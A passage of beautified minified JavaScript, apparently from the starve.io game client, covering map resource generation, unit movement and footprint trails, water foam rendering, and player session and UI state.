                                            de(f, "m", L, Math.max(1, Math.floor(+Q)), .2);
                                        de(f, "c", 0, Math.floor(36 * Q));
                                        for (var $, ee, g = [], te = g, G = Fe.biomes[f], ie = Math.floor(G.y1 / 100), ne = Math.floor(G.x1 / 100), re = Math.floor(G.h / 100), G = Math.floor(G.w / 100), oe = ie + Math.floor(re / 2), ae = ne + Math.floor(G / 2), y = 0; y < 3; y++)
                                            Te($ = Math.floor(oe - 3 + 6 * Fe.RNG.get()), ee = Math.floor(ae - 3 + 6 * Fe.RNG.get()), "plm", y, 1);
                                        for (y = 0; y < 80; y++)
                                            1 === Te($ = Math.floor(oe - 3 + 6 * Fe.RNG.get()), ee = Math.floor(ae - 3 + 6 * Fe.RNG.get()), "wtb", 0, 1) && te.push([$, ee, 0]);
                                        Ee(f, g)
                                    }
                                    if (i.t === Fe.BIOME_DRAGON) {
                                        P = H = void 0;
                                        for (var H = r, P = 0; P < 3; P++)
                                            de(H, "s", P, 15);
                                        for (P = 0; P < 3; P++)
                                            de(H, "a", P, 1);
                                        for (P = 0; P < 3; P++)
                                            de(H, "d", P, 1);
                                        ue(H)
                                    }
                                }
                        e1("isl", 1),
                            e1("wtb", 20),
                            e1("la", 1),
                            e1("c", 1),
                            e1("s", 1),
                            e1("f", 1),
                            e1("p", 1),
                            e1("g", 1),
                            e1("d", 1),
                            e1("a", 1),
                            e1("re", 1),
                            e1("m", 1),
                            $e = [],
                            Fe.map_wrapper(Eo)
                    }
                    ,
                    this.render_single_resource = Te,
                    this.map_wrapper = function (e) {
                        for (var t = 0; t < this.nh; t++)
                            for (var i = 0; i < this.nw; i++)
                                if (e.tiles[t] || (e.tiles[t] = []),
                                    e.tiles[t][i]) {
                                    var n = e.tiles[t][i];
                                    if (n.de && 0 < n.de.length)
                                        for (var r = 0; r < n.de.length; r++)
                                            if (n.de[r] && 0 < n.de[r].length)
                                                if (n.de = n.de[r][0],
                                                    41 <= r && r <= 49) {
                                                    n.de.scale = 3;
                                                    var o = Math.floor(3 * Math.random() + 1);
                                                    n.de.p = [];
                                                    for (var a = 0; a < o; a++)
                                                        n.de.p.push({
                                                            x: 120 * Math.random() - 60,
                                                            y: 120 * Math.random() - 60,
                                                            angle: Math.random() * Math.PI * 2,
                                                            _id: 41 + Math.floor(9 * Math.random())
                                                        })
                                                } else if (19 <= r && r <= 26)
                                                    for (n.de.scale = 3,
                                                        o = Math.floor(3 * Math.random() + 1),
                                                        n.de.p = [],
                                                        a = 0; a < o; a++)
                                                        n.de.p.push({
                                                            x: 120 * Math.random() - 60,
                                                            y: 120 * Math.random() - 60,
                                                            angle: Math.random() * Math.PI * 2,
                                                            _id: 19 + Math.floor(8 * Math.random())
                                                        });
                                                else
                                                    r <= 15 || 27 <= r && r <= 40 ? (n.de.angle = 0,
                                                        n.de.scale = 2) : (n.de.angle = Math.random() * Math.PI * 2,
                                                            n.de.scale = 1),
                                                        n.de._id = r;
                                    s(n, "p", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "t", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "s", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "g", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "d", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "b", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "f", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "sw", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "gw", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "dw", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "a", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "cs", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "plm", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "re", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "c", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10)),
                                        s(n, "m", new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10))
                                } else
                                    e.tiles[t][i] = []
                    }
                    ,
                    this.time = ze.DAY,
                    this.clock = {
                        translate: {
                            x: 0,
                            y: 0
                        },
                        init: 0,
                        hour: 0,
                        now: 0
                    },
                    this.delete_all_units = function () {
                        this.fast_units = [],
                            this.units[Ye.PLAYERS] = [],
                            this.units[Ye.WORKBENCH] = [],
                            this.units[Ye.FIRE] = [],
                            this.units[Ye.BIG_FIRE] = [],
                            this.units[Ye.SEED] = [],
                            this.units[Ye.SPIKE] = [],
                            this.units[Ye.STONE_SPIKE] = [],
                            this.units[Ye.GOLD_SPIKE] = [],
                            this.units[Ye.DIAMOND_SPIKE] = [],
                            this.units[Ye.AMETHYST_SPIKE] = [],
                            this.units[Ye.REIDITE_SPIKE] = [],
                            this.units[Ye.BRIDGE] = [],
                            this.units[Ye.WOOD_TOWER] = [],
                            this.units[Ye.ROOF] = [],
                            this.units[Ye.PLOT] = [],
                            this.units[Ye.WHEAT_SEED] = [],
                            this.units[Ye.ALOE_VERA_SEED] = [],
                            this.units[Ye.PUMPKIN_SEED] = [],
                            this.units[Ye.TOMATO_SEED] = [],
                            this.units[Ye.CARROT_SEED] = [],
                            this.units[Ye.WATERMELON_SEED] = [],
                            this.units[Ye.GARLIC_SEED] = [],
                            this.units[Ye.THORNBUSH_SEED] = [],
                            this.units[Ye.WINDMILL] = [],
                            this.units[Ye.EXTRACTOR_MACHINE_STONE] = [],
                            this.units[Ye.EXTRACTOR_MACHINE_GOLD] = [],
                            this.units[Ye.EXTRACTOR_MACHINE_DIAMOND] = [],
                            this.units[Ye.EXTRACTOR_MACHINE_AMETHYST] = [],
                            this.units[Ye.EXTRACTOR_MACHINE_REIDITE] = [],
                            this.units[Ye.WELL] = [],
                            this.units[Ye.WALL] = [],
                            this.units[Ye.STONE_WALL] = [],
                            this.units[Ye.GOLD_WALL] = [],
                            this.units[Ye.DIAMOND_WALL] = [],
                            this.units[Ye.AMETHYST_WALL] = [],
                            this.units[Ye.REIDITE_WALL] = [],
                            this.units[Ye.BED] = [],
                            this.units[Ye.WOOD_DOOR] = [],
                            this.units[Ye.STONE_DOOR] = [],
                            this.units[Ye.GOLD_DOOR] = [],
                            this.units[Ye.DIAMOND_DOOR] = [],
                            this.units[Ye.AMETHYST_DOOR] = [],
                            this.units[Ye.REIDITE_DOOR] = [],
                            this.units[Ye.WOOD_DOOR_SPIKE] = [],
                            this.units[Ye.STONE_DOOR_SPIKE] = [],
                            this.units[Ye.GOLD_DOOR_SPIKE] = [],
                            this.units[Ye.DIAMOND_DOOR_SPIKE] = [],
                            this.units[Ye.AMETHYST_DOOR_SPIKE] = [],
                            this.units[Ye.REIDITE_DOOR_SPIKE] = [],
                            this.units[Ye.FURNACE] = [],
                            this.units[Ye.TOTEM] = [],
                            this.units[Ye.WOOD_TOWER] = [],
                            this.units[Ye.CHEST] = [],
                            this.units[Ye.RESURRECTION] = [],
                            this.units[Ye.EMERALD_MACHINE] = [],
                            this.units[Ye.FRUIT] = [],
                            this.units[Ye.RABBIT] = [],
                            this.units[Ye.WOLF] = [],
                            this.units[Ye.CRAB] = [],
                            this.units[Ye.BOAR] = [],
                            this.units[Ye.BABY_MAMMOTH] = [],
                            this.units[Ye.CRAB_BOSS] = [],
                            this.units[Ye.BABY_DRAGON] = [],
                            this.units[Ye.BABY_LAVA] = [],
                            this.units[Ye.HAWK] = [],
                            this.units[Ye.PIRANHA] = [],
                            this.units[Ye.KRAKEN] = [],
                            this.units[Ye.FOX] = [],
                            this.units[Ye.PENGUIN] = [],
                            this.units[Ye.SPELL] = [],
                            this.units[Ye.FIREFLY] = [],
                            this.units[Ye.BEAR] = [],
                            this.units[Ye.MAMMOTH] = [],
                            this.units[Ye.VULTURE] = [],
                            this.units[Ye.SAND_WORM] = [],
                            this.units[Ye.DRAGON] = [],
                            this.units[Ye.LAVA_DRAGON] = [],
                            this.units[Ye.FLAME] = [],
                            this.units[Ye.WHEAT_MOB] = [],
                            this.units[Ye.ALOE_VERA_MOB] = [],
                            this.units[Ye.PUMPKIN_MOB] = [],
                            this.units[Ye.GARLIC_MOB] = [],
                            this.units[Ye.THORNBUSH_MOB] = [],
                            this.units[Ye.TREASURE_CHEST] = [],
                            this.units[Ye.DEAD_BOX] = [],
                            this.units[Ye.CRATE] = [],
                            this.units[Ye.BREAD_OVEN] = [],
                            this.units[Ye.SIGN] = [],
                            this.units[Ye.SPIDER] = [],
                            this.units[Ye.GIFT] = [],
                            this.units[Ye.GARLAND] = []
                    }
                    ,
                    this.delete_units = function (e) {
                        if (this.fast_units[e]) {
                            type = this.fast_units[e].type,
                                this.fast_units[e] = null;
                            for (var t = this.units[type], i = 0; i < t.length; i++)
                                if (t[i].uid == e)
                                    return void t.splice(i, 1)
                        }
                    }
                    ,
                    this.find_tower = function (e, t) {
                        for (var i = 0; i < this.units[Ye.WOOD_TOWER].length; i++) {
                            var n = this.units[Ye.WOOD_TOWER][i];
                            if (Math.floor(n.x / 100) === t && Math.floor(n.y / 100) === e)
                                return 1
                        }
                        return 0
                    }
                    ,
                    this.find_bridge = function (e, t) {
                        for (var i = 0; i < this.units[Ye.BRIDGE].length; i++) {
                            var n = this.units[Ye.BRIDGE][i];
                            if (Math.floor(n.x / 100) == e && Math.floor(n.y / 100) == t)
                                return !0
                        }
                        return !1
                    }
                    ,
                    this.move_units = function (e) {
                        for (var t, i, n, r = 0; r < e.length; r++) {
                            if ((b = e[r]).angle != b.nangle && (i = 2 * Math.PI,
                                b.angle = (b.angle + i) % i,
                                b.nangle = (b.nangle + i) % i,
                                b.angle != b.nangle) && (t = b.nangle - b.angle,
                                    n = (n = (n = Math.abs(t)) > Math.PI ? 2 * Math.PI - n : n) / Math.PI * 3 * Ue.ROTATE * qe,
                                    t > Math.PI || !(t < -Math.PI) && t < 0 ? b.angle -= n : b.angle += n,
                                    b.angle = (b.angle + i) % i,
                                    Math.abs(b.angle - b.nangle) < n) && (b.angle = b.nangle),
                                Math.floor(b.r.y / 100),
                                Math.floor(b.r.x / 100),
                                b.x == b.r.x && b.y == b.r.y || (b.action & R.IDLE && (b.action -= R.IDLE),
                                    b.action |= R.WALK,
                                    t = Utils.get_std_angle(b, b.r) + Math.PI,
                                    i = qe * b.speed,
                                    n = Utils.build_vector(i, t),
                                    Utils.norm(n) < Utils.norm(Utils.get_vector(b, b.r)) ? Utils.add_vector(b, n) : (b.action & R.WALK && (b.action -= R.WALK),
                                        b.action |= R.IDLE,
                                        Utils.copy_vector(b.r, b))),
                                b.ghost) {
                                var o = b.bubbles;
                                (0 === (d = o.length) || d < ze.GHOST_BUBBLES && o[d - 1].life < .95) && o.push({
                                    id: Math.floor(Math.random() * sprite[ze.BUBBLES][0].length),
                                    x: Math.floor(b.x + 80 * Math.random() - 40),
                                    y: Math.floor(b.y + 80 * Math.random() - 40),
                                    life: 1
                                });
                                for (var a = 0; a < d; a++)
                                    o[a].life = Math.max(0, o[a].life - qe);
                                for (a = 0; a < d; a++)
                                    if (0 === o[a].life) {
                                        o.splice(a, 1);
                                        break
                                    }
                            }
                            var s = 0;
                            if (b.move_effect && Se.quality) {
                                var _, E, u = b.swim, d = u.length;
                                for (0 < b.dist_water && b.vehicle !== Be.BABY_DRAGON && b.vehicle !== Be.BABY_LAVA && b.vehicle !== Be.PLANE && b.vehicle !== Be.HAWK && b.vehicle !== Be.NIMBUS && !b.ghost && (s = 1,
                                    0 === d || Utils.dist(u[d - 1], b) > ze.SWIM_SPACE) && (E = -b.angle,
                                        _ = 45 * Math.sin(E) * Pe,
                                        E = 45 * Math.cos(E) * Pe,
                                        u.push({
                                            x: b.x + _,
                                            y: b.y + E,
                                            r: 8,
                                            alpha: .8
                                        }),
                                        u.push({
                                            x: b.x - _,
                                            y: b.y - E,
                                            r: 8,
                                            alpha: .8
                                        }),
                                        u.push({
                                            x: b.x,
                                            y: b.y,
                                            r: 24,
                                            alpha: 1
                                        })),
                                    a = 0; a < d; a++)
                                    u[a].alpha = Math.max(0, u[a].alpha - qe / 2.2),
                                        u[a].r += 20 * qe;
                                0 < u.length && 0 === u[0].alpha && u.splice(0, 1);
                                var T, A, h, l = b.foot, I = (d = l.length,
                                    -1), c = Math.max(0, Math.sign(b.dist_sand)), O = Math.max(0, Math.sign(b.dist_winter)), g = (Math.max(0, Math.sign(b.dist_desert)),
                                        Math.max(0, Math.sign(b.dist_lava))), p = Math.max(0, Math.sign(b.dist_dragon));
                                for (0 < b.dist_sand || 0 < b.dist_desert ? I = ze.SAND_STEP : 0 < b.dist_dragon ? I = ze.CAVE_STEP : 0 < b.dist_winter ? I = ze.SNOW_STEP : 0 < b.dist_lava && (I = ze.LAVA_STEP),
                                    O = b.vehicle === Be.MOUNT_BOAR && 1 == (c | O | g | p) ? (I = ze.BOAR_STEP,
                                        T = b.vehicle_fx2 - Math.PI / 2,
                                        A = 15,
                                        h = 11,
                                        ze.STEP_SPACE) : b.vehicle === Be.BABY_MAMMOTH && 1 == (c | O | g | p) ? (I = ze.BABY_MAMMOTH_STEP,
                                            T = b.vehicle_fx2 - Math.PI / 2,
                                            A = 21,
                                            h = 16,
                                            ze.STEP_SPACE) : b.vehicle === Be.CRAB_BOSS && 1 == (c | O | g | p) ? (I = ze.CRAB_STEP,
                                                T = b.vehicle_fx2 - Math.PI / 2,
                                                A = 10 + (c = 50 * Math.random()),
                                                h = 0 + c,
                                                .9 * ze.STEP_SPACE) : (T = b.angle,
                                                    A = 15,
                                                    h = 11,
                                                    ze.STEP_SPACE),
                                    b.vehicle === Be.BABY_DRAGON || b.vehicle === Be.BABY_LAVA || b.vehicle === Be.NIMBUS || b.vehicle === Be.HAWK || b.vehicle === Be.PLANE || b.ghost || (b.vehicle === Be.SLED ? (0 === d || Utils.dist(l[d - 1], b) > ze.TRAIL_SPACE) && l.push({
                                        x: b.x,
                                        y: b.y,
                                        angle: b.vehicle_fx2,
                                        alpha: 1,
                                        id: ze.SLED_WAVE
                                    }) : -1 != I && 0 === s && (0 === d || Utils.dist(l[d - 1], b) > O) && (b.id_foot++,
                                        1 < Math.abs(b.x - b.r.x) && 1 < Math.abs(b.y - b.r.y) ? b.r.x > b.x && b.r.y < b.y || b.r.x < b.x && b.r.y > b.y ? b.id_foot % 2 ? E = _ = -h * Pe : _ = E = h * Pe : b.id_foot % 2 ? (_ = h * Pe,
                                            E = -h * Pe) : (E = h * Pe,
                                                _ = -h * Pe) : E = b.id_foot % 2 ? (_ = Math.sin(T) * A * Pe,
                                                    Math.cos(T) * A * Pe) : (_ = -Math.sin(T) * A * Pe,
                                                        -Math.cos(T) * A * Pe),
                                        l.push({
                                            x: b.x + _,
                                            y: b.y + E,
                                            angle: T + Math.PI / 2,
                                            alpha: 1,
                                            id: I
                                        }))),
                                    a = 0; a < d; a++)
                                    l[a].id === ze.SLED_WAVE ? l[a].alpha = Math.max(0, l[a].alpha - 1.5 * qe) : l[a].alpha = Math.max(0, l[a].alpha - qe / 2.85);
                                0 < l.length && 0 === l[0].alpha && l.splice(0, 1)
                            }
                        }
                    }
                    ,
                    this.update = function () {
                        this.move_units(this.units[Ye.PLAYERS]),
                            this.move_units(this.units[Ye.RABBIT]),
                            this.move_units(this.units[Ye.WOLF]),
                            this.move_units(this.units[Ye.CRAB]),
                            this.move_units(this.units[Ye.BOAR]),
                            this.move_units(this.units[Ye.BABY_MAMMOTH]),
                            this.move_units(this.units[Ye.CRAB_BOSS]),
                            this.move_units(this.units[Ye.BABY_DRAGON]),
                            this.move_units(this.units[Ye.BABY_LAVA]),
                            this.move_units(this.units[Ye.HAWK]),
                            this.move_units(this.units[Ye.SPIDER]),
                            this.move_units(this.units[Ye.FOX]),
                            this.move_units(this.units[Ye.PENGUIN]),
                            this.move_units(this.units[Ye.SPELL]),
                            this.move_units(this.units[Ye.FIREFLY]),
                            this.move_units(this.units[Ye.BEAR]),
                            this.move_units(this.units[Ye.MAMMOTH]),
                            this.move_units(this.units[Ye.VULTURE]),
                            this.move_units(this.units[Ye.SAND_WORM]),
                            this.move_units(this.units[Ye.DRAGON]),
                            this.move_units(this.units[Ye.FLAME]),
                            this.move_units(this.units[Ye.PIRANHA]),
                            this.move_units(this.units[Ye.KRAKEN]),
                            this.move_units(this.units[Ye.LAVA_DRAGON])
                    }
                    ,
                    this.breath = [],
                    this.breath[ze.LAKE] = new Utils.LinearAnimation(!1, 1, 1.05, 1, .008, .008),
                    this.breath[ze.LAKE_DEEP] = new Utils.LinearAnimation(!1, 1, 1.08, 1, .006, .006),
                    this.breath[ze.WAVE_ONE] = new Utils.LinearAnimation(!1, 1, 1.02, 1, .008, .008),
                    this.breath[ze.WAVE_TWO] = new Utils.LinearAnimation(!1, 1, 1.08, 1, .006, .006),
                    this.lava = [],
                    this.lava[0] = new Utils.LinearAnimation(!1, .1, 1, 0, .6, .6),
                    this.lava[1] = new Utils.LinearAnimation(!1, .4, 1, 0, .6, .6),
                    this.lava[2] = new Utils.LinearAnimation(!1, .3, 1, 0, .6, .6),
                    this.lava[3] = new Utils.LinearAnimation(!1, .8, 1, 0, .6, .6),
                    this.lava[4] = new Utils.LinearAnimation(!1, .3, 1, 0, .6, .6),
                    this.lava[5] = new Utils.LinearAnimation(!1, .8, 1, 0, .6, .6),
                    this.lava[6] = new Utils.LinearAnimation(!1, .5, 1, 0, .6, .6),
                    this.lava[7] = new Utils.LinearAnimation(!1, .9, 1, 0, .6, .6),
                    this.lava[8] = new Utils.LinearAnimation(!1, .6, 1, 0, .6, .6),
                    this.lava[9] = new Utils.LinearAnimation(!1, .2, 1, 0, .6, .6),
                    this.lava[10] = new Utils.LinearAnimation(!1, .6, 1, 0, .6, .6),
                    this.lava[11] = new Utils.LinearAnimation(!1, .4, 1, 0, .6, .6),
                    this.lava[12] = new Utils.LinearAnimation(!1, .8, 1, 0, .6, .6),
                    this.lava[13] = new Utils.LinearAnimation(!1, .2, 1, 0, .6, .6),
                    this.lava[14] = new Utils.LinearAnimation(!1, .7, 1, 0, .6, .6)
            }
            function E2(e, t, i, n) {
                this.id = e,
                    this.speed = 8 * (e + 5),
                    this.life = Le / 1366,
                    this.x = t,
                    this.y = i,
                    this.c = Math.cos(n),
                    this.s = Math.sin(n),
                    this.alpha = 0
            }
            function u2() {
                this.init = function () { }
                    ,
                    this.resurrection = {
                        pid: 1,
                        iid: 1,
                        open: !1
                    },
                    this.well = {
                        pid: 1,
                        iid: -1,
                        open: !1
                    },
                    this.windmill = {
                        amount_wheat: 0,
                        amount_flour: 0,
                        pid: 1,
                        iid: -1,
                        open: !1
                    },
                    this.extractor = {
                        amount_wood: 0,
                        amount_mineral: 0,
                        type: 0,
                        mineral: 0,
                        pid: 1,
                        iid: -1,
                        open: !1
                    },
                    this.bread_oven = {
                        amount_wood: 0,
                        amount_bread: 0,
                        amount_flour: 0,
                        pid: 1,
                        iid: -1,
                        open: !1
                    },
                    this.sign = {
                        iid: -1,
                        open: !1
                    },
                    this.furnace = {
                        amount: 0,
                        pid: 1,
                        iid: -1,
                        open: !1
                    },
                    this.ghost = {
                        enabled: !1,
                        delay: -1,
                        label: !1,
                        now: -1,
                        draw: dr
                    },
                    this.chest = {
                        id: -1,
                        amount: 0,
                        pid: 1,
                        iid: -1,
                        open: !1,
                        lock: !1,
                        locked: !1,
                        lockpick: !1,
                        padlock: !1
                    },
                    this.alive = !0,
                    this.reconnect = {
                        enabled: !1,
                        rotate: 0
                    },
                    this.key = Utils.gup("key", window.location.href);
                var e = Utils.gup("egg", window.location.href);
                function t() {
                    this.seed = 1,
                        this.seed2 = 2,
                        this.seed3 = 3,
                        this.seedv = 1,
                        this.seedv2 = 2,
                        this.seedv3 = 3,
                        this.new_seed = function () {
                            this.seed = 2 + Math.floor(Math.random() * Ue.SEED)
                        }
                        ,
                        this.new_seed2 = function () {
                            this.seed2 = 2 + Math.floor(Math.random() * Ue.SEED)
                        }
                        ,
                        this.new_seed3 = function () {
                            this.seed3 = 2 + Math.floor(Math.random() * Ue.SEED)
                        }
                        ,
                        this.new_seedv = function () {
                            this.seedv = 2 + Math.floor(Math.random() * Ue.SEED)
                        }
                        ,
                        this.new_seedv2 = function () {
                            this.seedv2 = 2 + Math.floor(Math.random() * Ue.SEED)
                        }
                        ,
                        this.new_seedv3 = function () {
                            this.seedv3 = 2 + Math.floor(Math.random() * Ue.SEED)
                        }
                        ,
                        this.draw_foam_vert = function (e, t, i, n, r, o, a) {
                            for (var s = 1; s < a;) {
                                var _, E, u = s * i % RAND_SIZE, d = RANDOM[u];
                                d < .1 ? (_ += 50,
                                    s += 50) : (_ = Math.floor(d * n + r),
                                        o < s && s < a && (d = .5 < Math.random() ? -10 * qe : 10 * qe,
                                            E = _ * t,
                                            this.bxv[u] = Math.max(-Ue.FLOAM_X, Math.min(Ue.FLOAM_X, this.bxv[u] + d)),
                                            this.byv[u] = Math.max(-Ue.FLOAM_Y, Math.min(Ue.FLOAM_Y, this.byv[u] + d)),
                                            0 < E) && (fe.beginPath(),
                                                fe.arc(s + xe.cam.x + this.byv[u], e + this.bxv[u] - .8 * Ue.FLOAM_X, E, 0, 2 * Math.PI),
                                                Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                                                    fe.fillStyle = Pr(83, 156, 160, 236, 247, 249, d)) : fe.fillStyle = ze.FLOAM_COLOR[Fe.time],
                                                fe.fill()),
                                        s += 2 * _)
                            }
                        }
                        ,
                        this.draw_foam = function (e, t, i, n, r, o, a) {
                            for (var s = 1; s < a;) {
                                var _, E, u = s * i % RAND_SIZE, d = RANDOM[u];
                                d < .1 ? (_ += 50,
                                    s += 50) : (_ = Math.floor(d * n + r),
                                        o < s && s < a && (d = .5 < Math.random() ? -10 * qe : 10 * qe,
                                            E = _ * t,
                                            this.bx[u] = Math.max(-Ue.FLOAM_X, Math.min(Ue.FLOAM_X, this.bx[u] + d)),
                                            this.by[u] = Math.max(-Ue.FLOAM_Y, Math.min(Ue.FLOAM_Y, this.by[u] + d)),
                                            0 < E) && (fe.beginPath(),
                                                fe.arc(e + this.bx[u] - .8 * Ue.FLOAM_X, s + xe.cam.y + this.by[u], E, 0, 2 * Math.PI),
                                                Fe.transition ? (d = Fe.time ? 1 - Fe.shade.v : Fe.shade.v,
                                                    fe.fillStyle = Pr(83, 156, 160, 236, 247, 249, d)) : fe.fillStyle = ze.FLOAM_COLOR[Fe.time],
                                                fe.fill()),
                                        s += 2 * _)
                            }
                        }
                        ,
                        this.draw_foams_bottom = function (e, t, i, n, r, o) {
                            var a;
                            r -= 30,
                                o += 30,
                                0 == (a = -(i - Ue.LW1SX - n - 2) / Ue.W1EX) && this.new_seed3(),
                                fe.globalAlpha = Utils.ease_in_out_quad(a),
                                this.draw_foam_vert(i, a, this.seed3, 18, 16, r, o),
                                fe.globalAlpha = 1,
                                0 == (a = -(e - Ue.LW2SX - n + 500) / Ue.W2EX) && this.new_seed(),
                                fe.globalAlpha = Utils.ease_in_out_quad(a),
                                this.draw_foam_vert(e, a, this.seed, 12, 10, r, o),
                                -(fe.globalAlpha = 1) !== t && ((a = -(t - Ue.LW3SX - n + 698) / Ue.W3EX) <= .01 && this.new_seed2(),
                                    fe.globalAlpha = Utils.ease_in_out_quad(a),
                                    this.draw_foam_vert(t, a, this.seed2, 6, 6, r, o),
                                    fe.globalAlpha = 1)
                        }
                        ,
                        this.draw_foams_top = function (e, t, i, n, r, o) {
                            var a;
                            r -= 30,
                                o += 30,
                                0 == (a = -(-i + Ue.LW1SX + n + 2) / Ue.W1EX) && this.new_seed3(),
                                fe.globalAlpha = Utils.ease_in_out_quad(a),
                                this.draw_foam_vert(i, a, this.seed3, 18, 16, r, o),
                                fe.globalAlpha = 1,
                                0 == (a = -(-e + Ue.LW2SX + n) / Ue.W2EX) && this.new_seed(),
                                fe.globalAlpha = Utils.ease_in_out_quad(a),
                                this.draw_foam_vert(e, a, this.seed, 12, 10, r, o),
                                -(fe.globalAlpha = 1) !== t && ((a = -(-t + Ue.LW3SX + n) / Ue.W3EX) <= .01 && this.new_seed2(),
                                    fe.globalAlpha = Utils.ease_in_out_quad(a),
                                    this.draw_foam_vert(t, a, this.seed2, 6, 6, r, o),
                                    fe.globalAlpha = 1)
                        }
                        ,
                        this.draw_foams_left = function (e, t, i, n, r, o) {
                            var a;
                            r -= 30,
                                o += 30,
                                0 == (a = -(-i + Ue.LW1SX + n + 2) / Ue.W1EX) && this.new_seed3(),
                                fe.globalAlpha = Utils.ease_in_out_quad(a),
                                this.draw_foam(i, a, this.seed3, 18, 16, r, o),
                                fe.globalAlpha = 1,
                                0 == (a = -(-e + Ue.LW2SX + n) / Ue.W2EX) && this.new_seed(),
                                fe.globalAlpha = Utils.ease_in_out_quad(a),
                                this.draw_foam(e, a, this.seed, 12, 10, r, o),
                                -(fe.globalAlpha = 1) !== t && ((a = -(-t + Ue.LW3SX + n) / Ue.W3EX) <= .01 && this.new_seed2(),
                                    fe.globalAlpha = Utils.ease_in_out_quad(a),
                                    this.draw_foam(t, a, this.seed2, 6, 6, r, o),
                                    fe.globalAlpha = 1)
                        }
                        ,
                        this.draw_foams_right = function (e, t, i, n, r, o) {
                            var a;
                            r -= 30,
                                o += 30,
                                0 == (a = -(i - Ue.LW1SX - n - 2) / Ue.W1EX) && this.new_seed3(),
                                fe.globalAlpha = Utils.ease_in_out_quad(a),
                                this.draw_foam(i, a, this.seed3, 18, 16, r, o),
                                fe.globalAlpha = 1,
                                0 == (a = -(e - Ue.LW2SX - n + 500) / Ue.W2EX) && this.new_seed(),
                                fe.globalAlpha = Utils.ease_in_out_quad(a),
                                this.draw_foam(e, a, this.seed, 12, 10, r, o),
                                -(fe.globalAlpha = 1) !== t && ((a = -(t - Ue.LW3SX - n + 698) / Ue.W3EX) <= .01 && this.new_seed2(),
                                    fe.globalAlpha = Utils.ease_in_out_quad(a),
                                    this.draw_foam(t, a, this.seed2, 6, 6, r, o),
                                    fe.globalAlpha = 1)
                        }
                        ,
                        this.w1 = {
                            r: new Utils.Ease(Utils.ease_out_cubic, 0, 10, Ue.W1SX, Ue.W1SX, Ue.W1EX),
                            l: new Utils.Ease(Utils.ease_in_out_cubic, 0, 10, Ue.W1EX, Ue.W1EX, Ue.W1SX)
                        },
                        this.w2 = {
                            r: new Utils.Ease(Utils.ease_out_quart, 0, 10, Ue.W2SX, Ue.W2SX, Ue.W2EX),
                            l: new Utils.Ease(Utils.ease_in_out_quad, 0, 10, Ue.W2EX, Ue.W2EX, Ue.W2SX)
                        },
                        this.w3 = {
                            r: new Utils.Ease(Utils.ease_out_quint, 0, 10, Ue.W3SX, Ue.W3SX, Ue.W3EX),
                            l: new Utils.Ease(Utils.ease_in_out_quad, 0, 10, Ue.W3EX, Ue.W3EX, Ue.W3SX)
                        },
                        this.t_ = function (e) {
                            return e.r.x !== e.r.ex || e.l.x === e.l.ex ? e.r : e.l
                        }
                        ,
                        this.t = function (e) {
                            e = e.r.x === e.r.ex ? e.l.x === e.l.ex ? (e.r.restart(),
                                e.l.restart(),
                                e.r) : e.l : e.r;
                            return e.ease(e.ex),
                                e
                        }
                        ,
                        this.bx = [],
                        this.by = [],
                        this.bxv = [],
                        this.byv = [],
                        this.init = function () {
                            for (var e = 0; e < RAND_SIZE; e++)
                                this.bx[e] = Math.floor(RANDOM[e] * Ue.FLOAM_X),
                                    this.by[e] = Math.floor(RANDOM[e] * Ue.FLOAM_Y),
                                    this.bxv[e] = Math.floor(RANDOM[e] * Ue.FLOAM_X),
                                    this.byv[e] = Math.floor(RANDOM[e] * Ue.FLOAM_Y);
                            this.w1.r.x = this.w1.r.ex,
                                this.w2.r.ed = 3.5,
                                this.w3.r.ed = 2
                        }
                        ,
                        this.init()
                }
                e && (Se.skin = parseInt(e)),
                    this.beta = 0 === window.location.href.indexOf("http://starve.io/beta") ? 1 : 0,
                    this.key && this.beta ? Cookies.set("starve_beta", this.key) : this.beta && (this.key = Cookies.get("starve_beta")),
                    this.token = Settings.Tokenjoin.e ? Settings.Tokenjoin.join : Cookies.get("starve_token") ? Cookies.get("starve_token") : Utils.generate_token(i2.TOKEN_LEN),
                    this.token_id = Cookies.get("starve_token_id") ? Cookies.get("starve_token_id") : "",
                    this.id = 0,
                    this.uid = 0,
                    this.day = 0,
                    this.die = {
                        howdie: "",
                        score: 0,
                        bank: 0,
                        kill: 0
                    },
                    this.account = {
                        connected: 0,
                        last: (new Date).getTime()
                    },
                    this.team = [],
                    this.in_team = function (e) {
                        for (var t = 0; t < this.team.length; t++)
                            if (this.team[t] == e)
                                return !0;
                        return !1
                    }
                    ,
                    this.shop = {
                        delay: 0,
                        time: 0,
                        value: 0,
                        open: !1,
                        draw: function () {
                            var e;
                            this.open && (e = (new Date).getTime(),
                                this.time = Math.floor((e - this.delay) / 1e3),
                                this.time < 60 ? Je.shop.button.draw(fe) : (document.getElementById("shop_starterkit").style.display = "none",
                                    this.open = !1))
                        }
                    },
                    this.totem = {
                        id: -1,
                        pid: -1,
                        lock: 0,
                        timeout: new Utils.LinearAnimation(!1, 0, 1, 0, 1 / 30, 1),
                        wait: !1
                    },
                    this.helmet = {
                        timeout: new Utils.LinearAnimation(!1, 0, 1, 0, .2, 1),
                        wait: !1
                    },
                    this.build = {
                        timeout: new Utils.LinearAnimation(!1, 0, 1, 0, 1, 1),
                        wait: !1
                    },
                    this.weapon = {
                        timeout: new Utils.LinearAnimation(!1, 0, 1, 0, .1, 1),
                        wait: !1
                    },
